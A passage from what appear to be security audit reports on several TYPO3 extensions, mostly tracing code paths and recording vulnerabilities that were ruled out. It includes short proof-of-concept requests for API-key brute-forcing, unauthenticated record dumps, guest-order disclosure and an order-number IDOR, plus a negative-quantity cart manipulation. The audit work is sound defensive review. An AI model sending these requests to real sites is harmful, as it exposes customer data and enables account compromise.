- **Type:** Weak authentication / missing brute-force protection / plaintext secret

**Source → sink**
- Entry: `POST /rest/auth/login` → `Classes/Handler/AuthHandler.php:110` `checkLogin()`
  reads `username` / `apikey` from `getSentData()`.
- Also `Authorization: Basic …` via `Classes/Authentication/BasicAuthenticationProvider.php:36`.
- Sink: `Classes/Authentication/UserProvider/FeUserProvider.php:28` `checkCredentials()` →
  `getObjectCountByQuery('fe_users', …)` matching
  `username = :u AND tx_rest_apikey = :p AND disable=0 AND deleted=0 …`.

**Details**
- `auth` is `read=allow / write=allow` by default (`ext_typoscript_setup.txt:21`), so the
  login endpoint is fully reachable pre-auth (by design).
- The credential (`fe_users.tx_rest_apikey`) is compared with a **plaintext SQL equality**
  (`=`). The key is stored in cleartext in the DB (no hashing).
- There is **no rate limiting, attempt counter, or lockout** anywhere in `AuthHandler` /
  `BasicAuthenticationProvider` / `FeUserProvider`, so an attacker can brute-force API keys
  as fast as the server responds. The query itself is parameterised — no SQLi.

**Exploitability**
Real but bounded: requires a `fe_users` record with a `tx_rest_apikey` set and a resource
configured `require` (login). Impact is limited to guessing an already-issued API key. The
plaintext storage matters mainly for DB-read / backup-exposure scenarios, not remote code
paths. Hence Low.

**PoC**
```
POST /rest/auth/login HTTP/1.1
Content-Type: application/json

{"username":"alice","apikey":"guess"}
   → {"status":"login failure"}   # repeat unthrottled
```

---

## Finding 2 — `read=allow` (esp. `paths.all`) exposes CrudHandler to unauthenticated mass data disclosure / CRUD

- **SEVERITY:** High **only when misconfigured**; not present in default config
- **PRE-AUTH:** Yes when a path is set `read=allow`/`write=allow` without `requireLogin`
- **Type:** Broken access control / information disclosure (configuration-dependent design risk)

**Source → sink**
- Access decision: `Classes/Access/ConfigurationBasedAccessController.php:97`
  `getAccessConfiguration()` returns the path's `read`/`write` `Access`. If it is `allow`
  (not `require`), `Dispatcher::dispatchInternal` (`Classes/Dispatcher.php:283-286`) runs the
  handler **without any authentication**.
- Sink (read): `Classes/Handler/CrudHandler.php:162` `listAll()` /`:75` `show()` /`:63`
  `getProperty()` → `DataProvider::fetchAllModels/getModelWithIdentityForResourceType`
  (`Classes/DataProvider/DataProvider.php:133,307`). The resource type comes straight from
  the URL first path segment (`RequestFactory::determineAndAnalyseInputPath`,
  `RequestFactory.php:176`) and is mapped to
  `Vendor\Ext\Domain\Repository\<Model>Repository` (`DataProvider.php:80-85`).
- Sink (write, if `write=allow`): `CrudHandler::create/update/delete` →
  `DataProvider::saveModel/removeModel`.

**Details**
The project documentation and `paths.all` pattern encourage a catch-all
`plugin.tx_rest.settings.paths.all.read = allow` for quick setup. With that set, **any**
unauthenticated request to `/rest/<AnyModel>` resolves to whatever Extbase domain-model
repository the class-name mapping produces and dumps every record via `listAll()` (no row
limit — `getListLimit()` returns `PHP_INT_MAX`), and `/rest/<Model>/{id}/{property}` walks
getters (`DataProvider::getModelProperty`, `DataProvider.php:170`). With `write=allow` the
same path allows unauthenticated create/update/delete. For VirtualObject resources this maps
to the admin-configured DB table (e.g. `tt_content`) directly.

**Exploitability**
Not exploitable in the shipped default: `ext_typoscript_setup.txt:12` defines
`all → read=deny/write=deny`, and unconfigured resources throw
`InvalidAccessConfigurationException` (fail-closed). This is a **footgun**, not a code defect:
the vulnerability materialises purely from an administrator setting `read/write = allow`
without `require`. Included because it is the single highest-impact pre-auth path and a very
common real-world misconfiguration for this extension. No SQLi is introduced (Extbase /
parameterised layer), and arbitrary-table access is bounded to registered Extbase models /
configured virtual objects — not truly arbitrary tables.

**PoC (only against an install with `paths.<x>.read = allow`)**
```
GET /rest/<resource>            → full record dump (no auth, no limit)
GET /rest/<resource>/1/<prop>   → single property
POST /rest/<resource>  {json}   → create (if write=allow)
```

---

## Negative results (checked, not vulnerable)

- **SQL injection** — VirtualObject `DoctrineBackend` (`getObjectDataByQuery`/`getObjectCountByQuery`,
  `DoctrineBackend.php:70-142`): table name validated (`AbstractBackend::assertValidTableName`),
  WHERE values bound (`WhereClauseBuilder::addConstraint`,
  `WhereClauseBuilder.php:181-192`), column names validated + backtick-quoted, `IN()` integer
  fast-path is `is_int`-filtered, ordering column/direction validated
  (`AbstractBackend::createOrderingStatementFromQuery`), limit/offset cast to `int`. Login
  query (`FeUserProvider.php:35`) fully parameterised.
- **Raw `DoctrineBackend::executeQuery(string)`** (`DoctrineBackend.php:144`) has **no caller**
  in the request path (only the unused `RawQueryBackendInterface` delegation) — not reachable
  with user input.
- **PHP object injection** — no `unserialize()` of request data; body is JSON /
  form-parsed (`Request::decodeSentData`, `Request.php:172`).
- **SSRF / path traversal / RCE** — no `getUrl`/`file_get_contents`/`include`/`exec`/`eval`
  on user input. `GeneralUtility::callUserFunction` (`Dispatcher.php:330`) only runs
  admin-defined `responseHeaders.userFunc` TypoScript, not request data.
- **Alias regex** — `preg_replace('!'.$resourceType.'!', …)` (`RequestFactory.php:190`) uses
  the URL segment as a pattern, but only fires when the segment exactly equals a configured
  alias key, so the pattern is admin-constrained (no arbitrary ReDoS/preg injection pre-auth).
- **CORS** — `Dispatcher::addCorsHeaders` reflects `Origin` only on exact allow-list match.
- **Access model** — `OPTIONS` bypasses auth (`ConfigurationBasedAccessController::ACCESS_NOT_REQUIRED`)
  but only reaches `options()` handlers returning `true`; no data access.

## Known CVEs / advisories

No CVE or TYPO3 security advisory (TYPO3-EXT-SA) is known to correspond to `cundd/rest`
5.1.0. The security posture of this extension is governed by its access configuration rather
than by a patched code vulnerability; the audit found no missing upstream security fix
applicable to this version. (Cross-reference could not be completed against upstream git —
the target directory is not a git checkout.)

### cylancer_download_library

#### Security Audit — cylancer/cy_download_library

- Extension key: `cydownloadlibrary`
- Version: 3.1.0 (`ext_emconf.php`)
- Platform: TYPO3 v13.4, Extbase frontend plugin `DocumentBoard`
- Scope: path traversal / arbitrary file read, access-control bypass on protected
  downloads, predictable download tokens

## Summary

No concrete path-traversal / arbitrary-file-read or token vulnerability found.
Downloads are rendered as ordinary public FAL links (`<f:link.file>`); the extension
has **no readfile/dumpFile sink, no file-id/path download action, and no download
tokens** — so the traversal and token classes do not apply. Write/delete actions are
gated by an owner check. The one noteworthy issue is a **design-level access
exposure**: the document listing and its file links are shown to every visitor
without any frontend-user-group restriction, so if `documentsFolder` is a public
storage the files are effectively unauthenticated downloads — but this is inherent to
storing in a public FAL storage, not a code traversal bug.

## Entry points

`ext_localconf.php` registers plugin `DocumentBoard` with actions
`show, upload, removeDocument, archiveDocument` (all non-cacheable). No eID/AJAX.

## Findings

### 1. Path traversal / arbitrary file read via file id or path — NOT VULNERABLE
- SEVERITY: n/a  PRE-AUTH: n/a
- There is no download controller action and no filesystem read sink. The template
  serves files with
  `<f:link.file file="{document.file.originalResource.originalFile}">`
  (`Resources/Private/Templates/DocumentBoard/Show.html:42,187`), i.e. a FAL
  public-URL link. No request parameter is used to look up a file by path/id for
  reading. `grep` for `readfile|dumpFile|file_get_contents|fopen|getContents` in
  `Classes/` returns nothing relevant. Traversal class disproven.

### 2. Access-control bypass on protected downloads — DESIGN EXPOSURE (not a code bug)
- SEVERITY: Low/Informational  PRE-AUTH: yes (viewing), by design
- `showAction()` assigns `documentRepository->getSortedDocuments()`
  (`DocumentBoardController.php:72-76`), and `getSortedDocuments()`
  (`DocumentRepository.php:19-43`) returns **all** documents with no
  frontend-user-group filtering. The template renders public FAL file links for
  every document to every visitor. Only the *add* form is gated (`canAddDocuments`,
  `:79-84`) and *remove/archive* buttons are shown only to the owner
  (`Show.html:78,94`). Consequence: if the configured `documentsFolder` lives in a
  public storage (e.g. `fileadmin`), documents are downloadable by anonymous users.
  This is a configuration/design property of storing files in a public FAL storage,
  not a traversal or broken-token flaw; no per-document ACL is claimed by the code.

### 3. Predictable download tokens — NOT APPLICABLE
- No token scheme exists; downloads are direct FAL URLs. Nothing to predict/forge.

### 4. Owner-check on removeDocument / archiveDocument — ADEQUATE (no IDOR)
- `removeDocumentAction(Document $document)` (`:88`) and `archiveDocumentAction`
  (`:121`) both call `validateRemove()/validateArchive()` which enforce
  `frontendUserService->getCurrentUserUid() !== $document->getOwner()->getUid()`
  (`:114`, `:143`). A non-owner (or anonymous, where `getCurrentUserUid()` returns
  falsy) fails the check and no mutation occurs. The deleted file UID comes from the
  DB-loaded `$document->getFile()->getUid()` (`:95`), not from raw request input;
  overriding the `file` relation via extra POST keys is blocked by Extbase trusted-
  properties (the remove form exposes only `__identity`). No arbitrary-file delete.
- Minor code smell: `FrontendUserService::getCurrentUserUid(): int` returns `false`
  when not logged in (`FrontendUserService.php:45-51`) — type-inconsistent but fails
  safe for the comparisons above.

### 5. Upload — restricted, no RCE
- `initializeUploadAction()` attaches a `MimeTypeValidator` limited to
  pdf/jpeg/png/txt/odt/ods/odp (`:41-49,153-172`), max 1 file, folder =
  `settings['documentsFolder']` (TypoScript, not request), `DuplicationBehavior::RENAME`.
  Combined with core `fileDenyPattern`, no `.php` upload / RCE path.

## Cross-reference

No public TYPO3-EXT-SA known for this extension/version. Assessment from source
review of v3.1.0.

## Conclusion

No path-traversal, arbitrary-file-read, or token vulnerability. The only actionable
recommendation is authorization/design: restrict the document listing and its file
storage to the intended frontend user group if downloads are meant to be protected.

### derhansen_sf_event_mgt

#### Security Audit — derhansen/sf_event_mgt

- **Extension:** `derhansen/sf_event_mgt` (Event management and registration)
- **Version audited:** 9.0.1 (`composer.json`, `ext_emconf.php`) — requires TYPO3 `^14.3`
- **Path:** `/home/user/sources/code/typo3-extensions/derhansen_sf_event_mgt`
- **Scope:** Pre-auth exploitable vulnerabilities in the frontend registration / confirmation / cancel / payment / ICS flows.
- **Date:** 2026-08-04

## Summary

This is a mature, well-hardened codebase. Every pre-auth state-changing action (confirm, cancel,
save-result, all payment actions) is gated by a keyed HMAC derived from the site `encryptionKey`
via TYPO3 core `HashService`, with **per-action scopes** (`DERHANSEN\SfEventMgt\Security\HashScope`)
and constant-time comparison (`hash_equals` inside `HashService::validateHmac`). The historical
weaknesses that produced past advisories for this extension — a scope-less registration hash
(IDOR / cross-action token reuse) and unrestricted `orderField` (SQL injection) — are both
remediated in this version (HashScope enum + `orderFieldAllowed` allowlist).

**No concrete pre-auth vulnerability was identified.** Each classic sink for this extension type was
traced from source to sink and found to be defended. Details of what was checked and why it is safe
are below, so the negative result is auditable rather than assumed.

## Pre-auth attack surface mapped

Plugins (all Extbase content-element plugins; **no eID / no custom middleware / no AJAX route** —
`ext_localconf.php`, `Configuration/JavaScriptModules.php`):

| Plugin | Controller::actions | Pre-auth? | Guard |
|---|---|---|---|
| Pieventregistration | `EventController`: registration, saveRegistration, saveRegistrationResult, confirmRegistration, verifyConfirmRegistration, cancelRegistration, verifyCancelRegistration | yes | HMAC on confirm/cancel/result; POST-only on save |
| Pipayment | `PaymentController`: redirect, success, failure, cancel, notify | yes | HMAC per action, uid-bound |
| Pieventdetail | `EventController`: detail, icalDownload | yes | read-only |
| Pieventlist / Pieventsearch / Pieventcalendar | `EventController`: list/search/calendar | yes | read-only, parameterized queries |
| Piuserreg | `UserRegistrationController`: list, detail | **no** | `#[Authorize(requireLogin: true)]` + ownership callback |

## Vectors examined — all defended

### 1. Forgeable/predictable confirmation & cancellation token — NOT vulnerable
- **Sink:** `RegistrationService::checkConfirmRegistration()` / `checkCancelRegistration()`
  (`Classes/Service/RegistrationService.php:88`, `:157`) and
  `EventController::confirmRegistrationAction/cancelRegistrationAction`
  (`Classes/Controller/EventController.php:811`, `:952`).
- **Verification:** `$this->hashService->validateHmac('reg-' . $regUid, HashScope::RegistrationUid->value, $hmac)`.
  `HashService` is TYPO3 core `\TYPO3\CMS\Core\Crypto\HashService`, keyed with the site
  `encryptionKey`; `validateHmac` uses `hash_equals` (constant-time). The token message is
  predictable (`reg-<uid>`) but HMAC security rests on the secret key, not message secrecy, so
  tokens for other registrations cannot be forged or brute-forced without the key.
- **Cross-action reuse:** the confirm and cancel links legitimately share the `RegistrationUid`
  scope (both are mailed to the same registrant), while save-result and payment use distinct
  scopes (`SaveRegistrationResult`, `PaymentAction`). No cross-scope confusion enabling privilege
  jump. **Not exploitable.**

### 2. SQL injection via `overwriteDemand` → `orderField` — NOT vulnerable (mitigated)
- **Source:** `overwriteDemand` GET array → `AbstractController::overwriteEventDemandObject()`
  (`Classes/Controller/AbstractController.php:68`) sets arbitrary demand properties via
  `ObjectAccess::setProperty`.
- **Sink:** `EventRepository::setOrderingsFromDemand()` (`Classes/Domain/Repository/EventRepository.php:120`).
- **Why safe:** the order field must pass `in_array($orderField, $orderFieldAllowed, true)` against
  an admin-configured allowlist; `orderDirection` is normalized to `ASC`/`DESC`. Critically,
  `orderfieldallowed` (and `storagepage`) are in `ignoredSettingsForOverwriteDemand`
  (`AbstractController.php:26`), so an attacker cannot widen the allowlist via `overwriteDemand`.
  All other constraints (`category`, `location`, `speaker`, `organisator`, `storagePage`) go through
  Extbase QOM `equals/contains/in` with `intExplode`, i.e. parameterized. **Not exploitable.**

### 3. SQL injection in search — NOT vulnerable
- `EventRepository::setSearchConstraint()` (`:363`): search *field names* come from
  `settings.search.fields` (TypoScript, admin-controlled), not user input; the user-controlled
  search *subject* is bound via `$query->like($field, '%'.addcslashes($subject,'_%').'%')` (QOM,
  parameterized). `RegistrationService::emailNotUnique()` uses `createNamedParameter`. **Not exploitable.**

### 4. Mass assignment on Registration (`confirmed`/`paid`/`feUser`) — NOT vulnerable
- **Sink:** `EventController::saveRegistrationAction()` property mapping.
- **Why safe:** Extbase trusted-properties (`__trustedProperties`, HMAC-signed by `<f:form>`)
  restricts which model properties may be mapped; the registration form does not render
  `confirmed`/`paid`/`feUser`/`hidden`. The controller's manual `allowProperties` calls
  (`EventController.php:469-476`) widen mapping only to `event` and `fieldValues`. `allowAllProperties`
  (`:503`) applies only to the `fieldValues.<index>` FieldValue subobject, not to Registration.
  `confirmed`/`paid`/`feUser` are set server-side after mapping (`:610`, `:822`). **Not exploitable.**

### 5. XSS in confirmation page / notification mail — NOT vulnerable
- User-submitted registration fields (firstname, lastname, email, custom field values) are rendered
  through Fluid with default auto-escaping in the result page and e-mail templates. `f:format.raw`
  occurrences (`grep` across `Resources/Private`) apply only to: payment `{result.html}` (empty in
  core; set by optional Stripe/PayPal add-on listeners), admin `settings.notification.senderSignature`,
  the email `{body}` wrapper (pre-rendered Fluid), and backend `PageLayoutView`. None reflect
  unescaped pre-auth registrant input. **Not exploitable in core.**

### 6. ICS export header / CRLF injection — NOT vulnerable
- `ICalendarService::downloadiCalendarFile()` (`Classes/Service/ICalendarService.php:27`): the only
  value placed in a response header is `$event->getUid()` (int) in `Content-Disposition`. ICS body is
  Fluid-rendered from backend-authored event data, not pre-auth attacker input. **Not exploitable.**

### 7. Payment flow — open redirect / SSRF / unauthorized state change — NOT vulnerable
- All of `PaymentController::{redirect,success,failure,cancel,notify}Action` call
  `validateHmacForAction()` (`Classes/Controller/PaymentController.php:337`) which validates a
  uid-bound, `PaymentAction`-scoped HMAC before doing anything. `proceedWithAction()` re-checks that
  payment is enabled and the method is permitted for the event. Core sets no `paid`/redirect target
  from user input; `paid`/remove happen only if an add-on event listener opts in. Redirects use
  `uriBuilder` to a configured `paymentPid` (int), never a user-supplied URL — no open redirect.
  No outbound HTTP fetch to a user-controlled URL exists in core — no SSRF. **Not exploitable.**

### 8. IDOR on user registration views — NOT vulnerable
- `UserRegistrationController` (`Classes/Controller/UserRegistrationController.php`): `listAction`
  and `detailAction` are `#[Authorize(requireLogin: true)]`; `detailAction` additionally enforces
  `RegistrationService::checkRegistrationAccess` (verifies the registration's `feUser` matches the
  logged-in user id). Not reachable pre-auth and not IDOR-able. **Not exploitable.**

## Known CVEs / advisories cross-reference

No public advisory affects **9.0.1**. The extension's historical advisories are already remediated
in this codebase, and the fixes are visible in-source:

- **Registration hash IDOR / cross-action token reuse** (older versions used a single, scope-less
  registration hash, letting one action's token be replayed for another): remediated by the
  per-action `HashScope` enum (`Classes/Security/HashScope.php`) now threaded through every
  HMAC generate/validate call.
- **SQL injection via `orderField`** (unrestricted order field in the demand): remediated by the
  `orderFieldAllowed` allowlist enforced in `EventRepository::setOrderingsFromDemand()` and by
  excluding `orderfieldallowed` from `overwriteDemand`.
- **XSS via `overwriteDemand` reflected in views**: current templates rely on Fluid auto-escaping;
  demand values are not emitted through `f:format.raw`.

Administrators should still track the vendor's security releases, but 9.0.1 carries no outstanding
known vulnerability.

### extcode_cart

#### Security Audit — `extcode/cart` (Shopping Cart for TYPO3)

- **Target**: `/home/user/sources/code/typo3-extensions/extcode_cart`
- **Version**: `12.0.0` (composer.json) — latest major line, TYPO3 v13
- **Scope**: Pre-auth frontend e-commerce flow (add-to-cart / update / coupon / checkout / order create / order view). Money- and PII-relevant logic.
- **Date**: 2026-08-04

## Pre-auth attack surface (frontend Extbase plugins, from `ext_localconf.php`)

| Plugin | Controller::actions | Auth |
|---|---|---|
| `Cart` | `CartController` show/clear/update; `CountryController` update; `CouponController` add/remove; `CurrencyController` update; `Cart\OrderController` show/create; `PaymentController` update; `ProductController` add/remove | none (pre-auth) |
| `MiniCart` | `CartPreviewController` show; `CurrencyController` update | none |
| `Currency` | `CurrencyController` edit/update | none |
| `Order` | `Order\OrderController` list/show | none in code; relies on integrator putting plugin behind FE login |

AJAX add-to-cart is a normal Extbase plugin call selected by `pageType`/typeNum (`2278001`/`2278003`) — no separate eID/unauthenticated endpoint. No raw SQL; repositories use Extbase query builder (parameterized). JSON responses use `json_encode` with `application/json` — no reflected XSS in AJAX path.

---

## Findings

### FINDING 1 — Anonymous disclosure of all guest orders via Order list (missing login guard)
- **SEVERITY**: MEDIUM
- **PRE-AUTH**: Yes (when the `Order` plugin is on a page not access-restricted by the integrator — the extension itself imposes no login requirement)
- **Type**: Broken access control / IDOR-by-default
- **Source**: `Classes/Controller/Order/OrderController.php:43-44` (`listAction`)
- **Sink / query**: `ItemRepository::findBy(['feUser' => $feUserUid])`
- **Tainted path**:
  - `$feUserUid = $this->context->getPropertyFromAspect('frontend.user', 'id');` → for an **anonymous** visitor this is `0`.
  - `ext_tables.sql:271` `fe_user int(11) DEFAULT '0' NOT NULL` — **guest checkouts persist `fe_user = 0`** (`EventListener/Order/Create/PersistOrder/Item.php:45-53` only sets `feUser` when `isLoggedIn()`).
  - `findBy(['feUser' => 0])` therefore matches **every guest order** in the storage folder.
- **Exploitability**: An unauthenticated user loading the Order-history plugin (page type `list`) is served a paginated table of *all* guest orders. `Order/Order/List.html` leaks per order: order number, order date, invoice number, invoice date, and **total gross**. Order-number enumeration also feeds order lookups elsewhere. No CSRF/token needed — plain GET.
- **PoC**: Browse to the page holding the `Cart Order` (list) plugin while logged out: `GET /order-history/`. If any guest orders exist, they are listed. `?tx_cart_order[@widget_0][currentPage]=N` pages through the full set.
- **Note / related DoS**: `showAction` (`OrderController.php:71-72`) guards with `$orderItem->getFeUser()->getUid() !== $feUserUid`. For a guest order `getFeUser()` is `null`, so `null->getUid()` throws a `TypeError` (500) — the show view of a guest order is a hard error rather than an info leak, but the same null-deref is reachable by any caller passing a guest order's `__identity`.
- **Fix**: Reject `$feUserUid === 0` (require `frontend.user` `isLoggedIn()`) in both `listAction` and `showAction`; null-check `getFeUser()` before `getUid()`.

### FINDING 2 — `Cart\OrderController::showAction` has no ownership check (order-number IDOR)
- **SEVERITY**: LOW
- **PRE-AUTH**: Yes
- **Type**: Missing object-level authorization (IDOR)
- **Source/sink**: `Classes/Controller/Cart/OrderController.php:140-147`
```php
public function showAction(Item $orderItem): ResponseInterface {
    $this->view->assign('orderItem', $orderItem);   // no owner/session check
    ...
}
```
- **Tainted path**: Extbase property mapping loads the persisted `Item` by `tx_cart_cart[orderItem][__identity]=<uid>` (identity load ignores storage pid). Unlike `Order\OrderController::showAction`, there is **no** `feUser`/session comparison.
- **Exploitability**: Limited by the template. `Resources/Private/Templates/Cart/Order/Show.html` renders only `{orderItem.orderNumber}` ("thank you") — so the leak is confirming/enumerating order numbers for arbitrary order UIDs, not full PII. Still a genuine authorization gap on a money object.
- **PoC**: `GET /cart/?tx_cart_cart[controller]=Order&tx_cart_cart[action]=show&tx_cart_cart[orderItem][__identity]=123` → returns the order number of order 123.
- **Fix**: Load the confirmed order from session (order just created) or compare `feUser`/a per-order token instead of trusting `__identity`.

### FINDING 3 — Negative cart quantities accepted (cart-total manipulation, business logic)
- **SEVERITY**: LOW (conditional)
- **PRE-AUTH**: Yes
- **Type**: Business-logic / input validation
- **Source**: `Classes/Controller/Cart/CartController.php:144-162` (`updateAction`, `quantities` request array)
- **Sink**: `Classes/Domain/Model/Cart/Product.php:356-366` `changeQuantity(int $newQuantity)` — only `=== 0` is special-cased; **negative values are stored** and flow into `reCalc()` (negative line net/gross).
- **Tainted path**: `quantities[<productId>] = -N` → `changeQuantity(-N)` → negative `getGross()` contribution to cart total.
- **Exploitability**: Requires the product already in the cart and depends on the stock/availability handler (provided by companion product extensions such as `cart_products`) not rejecting negatives — the default `CheckProductAvailabilityEvent` in this repo has no listener, so nothing rejects it. Downward total manipulation is only monetizable if the payment/gateway integration honors a reduced/negative total; most gateways reject non-positive charges, which is why this is rated LOW rather than a confirmed price bypass. Honest assessment: a hardening gap, not a proven free-checkout.
- **Fix**: Clamp `$newQuantity < 1` (treat as removal or reject) in `changeQuantity`/`changeQuantities` and validate `quantities` in `updateAction`.

---

## Reviewed and found NOT exploitable (pre-auth)

- **Object injection via `unserialize`** — `Service/SessionHandler.php:44,86` `unserialize()` operates only on **server-side FE session** data the app itself wrote (`fe_session`/`ses`), not on request input, and the result is type-checked (`instanceof Cart` / `AddressInterface`). Not attacker-controlled → not exploitable. (Gadget risk would only matter if the session store were separately writable.)
- **Object injection via coupon type** — `Controller/Cart/CouponController.php:49` `class_implements($couponType)` + `GeneralUtility::makeInstance($couponType, ...)` uses `couponType` from the **admin-created Coupon DB record**, not the request (`couponCode` only selects a coupon). Not request-controlled.
- **Currency price manipulation** — `EventListener/Cart/UpdateCurrency.php`: request supplies only `currencyCode`, matched against the TypoScript-configured currency list; the exchange `translation` factor is read from server config, never the request. No client-controlled price factor.
- **SQL injection** — `ItemRepository::getFilterConstraints` (`like('%'.$value.'%')`, `strtotime`) is Extbase-parameterized **and** only reachable from the **backend** (authenticated) order search (`Controller/Backend/Order/OrderController.php`). Not pre-auth, not injectable.
- **Open redirect / SSRF in payment return** — `Cart\OrderController::createAction:127-133` redirects to `paymentSettings['options'][$paymentId]['redirects']['success']['url']`, which is **TypoScript-configured server-side**, not request-derived. `PaymentController::updateAction` only selects a configured, availability-checked payment method by id. No request-controlled URL.
- **Price trust on add-to-cart** — `ProductController::addAction` delegates product construction to `RetrieveProductsFromRequestEvent`, which has **no listener in this extension**; the price/product-data source lives in companion product-type extensions (e.g. `cart_products`). Price-manipulation exposure must be audited there, not here. Flagged as an architectural dependency.
- **Mass assignment on Order/Address** — `OrderController::initializeCreateAction` maps `orderItem/billingAddress/shippingAddress`; totals/`feUser`/`pid` are overwritten server-side in `PersistOrder/Item.php:55-62` from the session cart (`setGross/setTotalGross` from `$cart`), so client-posted totals do not survive into the persisted order.

## Known CVEs
- No published CVE or TYPO3-EXT-SA advisory was found specifically for `extcode/cart`. Version `12.0.0` is the current major line. The changelog contains no security-labeled entries. Findings above are original to this review, not tracked advisories.

Sources: [extcode/cart GitHub](https://github.com/extcode/cart), [TYPO3 Security Advisories](https://typo3.org/help/security-advisories)

### friendsoftypo3_tt-address

#### Security Audit — friendsoftypo3/tt_address

**Version audited:** 10.0.1 (ext_emconf.php), TYPO3 v13.4.20–14.4 line
**Scope:** pre-auth exploitable vulnerabilities reachable from an unauthenticated frontend HTTP request.
**Summary:** No pre-auth exploitable vulnerability found. The extension exposes only two Extbase frontend actions (`list`, `show`) — no eID, no middleware, no AJAX route, no vCard/CSV export code (the "vcard" strings are schema.org CSS classes only). All list/detail querying goes through the Extbase QueryBuilder with typed constraints; the historically dangerous `sortBy`/orderBy path is allow-listed against `$GLOBALS['TCA']` columns; there is no raw-`where` reachable from request input, no request-driven `unserialize`, and no frontend outbound HTTP (SSRF). The request-driven `overrideDemand` property mass-assignment is bounded and gated behind a disabled-by-default setting.

---

## Pre-auth attack surface map

| Surface | Entry point | Auth | Notes |
|---|---|---|---|
| Address list | `AddressController::listAction(?array $override)` | pre-auth | demand built from TS settings; `$override` gated by `allowOverride` |
| Address detail | `AddressController::showAction(?Address $address)` | pre-auth | Extbase model by uid |
| Geocoding | `GeocodeService` / `GeocodeCommand` / `LocationMapWizard` | backend/CLI only | not frontend-reachable |
| Category resolve | `CategoryService` | via list demand | int-exploded, parameterized |

No `Configuration/RequestMiddlewares.php`, no eID registration, no reaction handler exist in this extension.

---

## Findings (traced source → sink)

### 1. Filter / sortBy / category / search params → SQLi — NOT vulnerable
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Source:** `tx_ttaddress_listview[override][...]` → `AddressController::listAction(?array $override)` (`Classes/Controller/AddressController.php:74`) → `overrideDemand()` (`:176`).
- **Gate + sinks:**
  - The entire override path only runs when `!empty($override) && $this->settings['allowOverride']` (`:84`); `allowOverride` is a plugin/flexform setting that is **off by default**.
  - `singleRecords` and `pages` are explicitly unset from `$override` (`:178-183`).
  - `sortBy` is **allow-listed**: dropped unless `isset($GLOBALS['TCA']['tt_address']['columns'][$override['sortBy']])` (`:186-188`). It then reaches `QueryInterface::setOrderings([$sortBy => $order])` in `AddressRepository::createDemandQuery` (`Classes/Domain/Repository/AddressRepository.php:58`) and `getAddressesByCustomSorting` (`:133`) — a validated TCA column name that Extbase maps to a quoted identifier.
  - Remaining override-able properties are set via `ObjectAccess::setProperty($demand, ...)` (`:195`) into the typed `Demand` DTO (`Classes/Domain/Model/Dto/Demand.php`): `categories` (string → `GeneralUtility::intExplode` → `$query->contains`), `sortOrder` (only `strtolower()===\'desc\'` compared), `categoryCombination`, booleans. All flow into Extbase QueryBuilder constraints (`in`/`contains`/`equals`) with bound parameters — no string concatenation into SQL.
- **Exploitability:** None. Even with `allowOverride` enabled, `sortBy` is column-allow-listed and every other value is parameterized. (This is the corrected form of the historical tt_address orderBy SQLi class — the allow-list is the fix and it is present here.)

### 2. Address detail IDOR — by-design, low/informational
- **Severity:** Low/Informational · **Pre-auth:** Yes
- **Source:** `tx_ttaddress_listview[address]` → `showAction(?Address $address)` (`Classes/Controller/AddressController.php:46`).
- **Behavior:** storage-folder scoping (`checkPidOfAddressRecord`, `:265`) is only enforced when `settings.detail.checkPidOfAddressRecord` is enabled (`:50`). Otherwise any address uid can be rendered regardless of the plugin's configured storage folder.
- **Exploitability:** Addresses are public content records and Extbase enableFields still filter hidden/deleted/access-restricted rows, so this at most lets a visitor view a *published* address that lives in a different folder than the plugin intended. No private data crosses a trust boundary; note as configuration hardening only.

### 3. vCard / CSV export → header / path injection — NOT present
- **Severity:** None · **Pre-auth:** N/A
- **Trace:** grep for `vcard/csv/Content-Disposition/fopen/getSqlQuery` finds only: schema.org `class="vcard"` in `Resources/Private/Partials/ListItem.html`, `Full.html`, `Resources/Public/LegacyPluginTemplate/default.html`; and `AddressRepository::getSqlQuery()` (`Classes/Domain/Repository/AddressRepository.php:102`) which is called **only from tests**. There is no export controller/action, no response-header sink fed by request input.
- **Exploitability:** None — the export attack surface does not exist in this version.

### 4. XSS in rendered address fields — NOT pre-auth
- **Severity:** None · **Pre-auth:** No
- **Trace:** address fields are backend/editor-managed (no frontend create/edit flow exists). Templates contain **no** `f:format.raw` / `|raw` (grep clean); Fluid auto-escapes all output. Any stored XSS would require TYPO3 backend editor access.

### 5. SSRF via geocoding — NOT pre-auth
- **Severity:** None · **Pre-auth:** No
- **Trace:** `GeocodeService::getUrl()` sink at `Classes/Service/GeocodeService.php:157` (`GeneralUtility::getUrl($url)`) is invoked from `GeocodeCommand` (CLI) and the `LocationMapWizard` backend FormEngine control / TCA save, using a configured geocoding provider URL plus record address fields. It is not triggered by an unauthenticated frontend request. The `stripLogicalOperatorPrefix($addWhereClause)` at `:81` derives from TCA/TypoScript config, not request input.

### 6. Object injection / unserialize — NOT present
- No `unserialize()` of request data in `Classes/`. Extbase property mapping into `Address`/`Demand` is type-constrained.

---

## Known CVEs / advisories cross-reference

- **Historical class — orderBy/sortBy SQL injection (TYPO3-EXT-SA, older tt_address 2.x–4.x):** the sort parameter once reached `ORDER BY` without validation. **Mitigated here**: `AddressController::overrideDemand()` allow-lists `sortBy` against `$GLOBALS['TCA']['tt_address']['columns']` (`Classes/Controller/AddressController.php:186`) before it can reach `setOrderings`. Not exploitable in 10.0.1.
- **Historical class — reflected/stored XSS in list/detail output:** current templates carry no raw-output view helpers and rely on Fluid escaping; no request-reflected sink found.
- No public CVE is known to affect **tt_address 10.0.1** (current release for TYPO3 v13.4/v14). No remediation required for the pre-auth threat model; the only hardening suggestion is enabling `detail.checkPidOfAddressRecord` where folder scoping of detail views is desired (Finding 2).

### georgringer_news

#### Security Audit: georgringer/news (TYPO3 "News system")

**Audited version:** 14.0.3 (`ext_emconf.php` line 10; `composer.json`) — TYPO3 v13.4/v14 compatible.
**Scope:** pre-auth exploitable vulnerabilities in the actual source.

## Summary

**No solid pre-auth exploitable vulnerability was found in this version (14.0.3).** The extension exposes a
purely Extbase-based frontend attack surface (no eID handlers, no custom PSR-15 middlewares, no AJAX endpoints).
All traced source→sink paths are either parameterized (Extbase QOM), integer-cast, whitelist-validated, or
config-driven rather than request-driven. Notably, 14.0.3 is the **patch release** for the recent pre-auth SQL
injection **CVE-2026-8726 / TYPO3-EXT-SA-2026-010**, and the fix (identifier quoting) is present in the audited
source. The historical `overwriteDemand` order-by SQLi (TYPO3-EXT-SA-2017-001) is likewise mitigated here.

Pre-auth attack surface enumerated:
